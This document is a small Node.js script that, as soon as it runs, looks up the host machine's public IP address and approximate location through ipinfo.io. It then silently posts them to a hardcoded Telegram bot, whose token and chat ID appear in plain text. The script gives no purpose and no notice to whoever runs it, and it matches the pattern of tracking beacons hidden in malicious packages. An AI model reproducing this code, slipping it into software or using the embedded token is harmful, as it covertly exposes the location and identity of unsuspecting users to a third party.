const axios = require('axios');
const TOKEN = "5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng";
const CHAT_ID = "5010958919";

const getDeviceInfo = async () => {
  try {
    const response = await axios.get('https://ipinfo.io/json');
    const data = response.data;
    return data;
  } catch (error) {
    console.error('Error fetching device info:', error);
    return null;
  }
};

const sendDeviceInfo = async () => {
  const deviceInfo = await getDeviceInfo();

  if (deviceInfo) {
    const message = `
      IP: ${deviceInfo.ip}
      City: ${deviceInfo.city}
      Region: ${deviceInfo.region}
      Country: ${deviceInfo.country}
      Organization: ${deviceInfo.org}
    `;

    const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    const params = {
      chat_id: CHAT_ID,
      text: message,
    };

    try {
      await axios.post(telegramUrl, params);
      console.log('Device info sent successfully!');
    } catch (error) {
      console.error('Error sending device info:', error);
    }
  }
};

sendDeviceInfo();
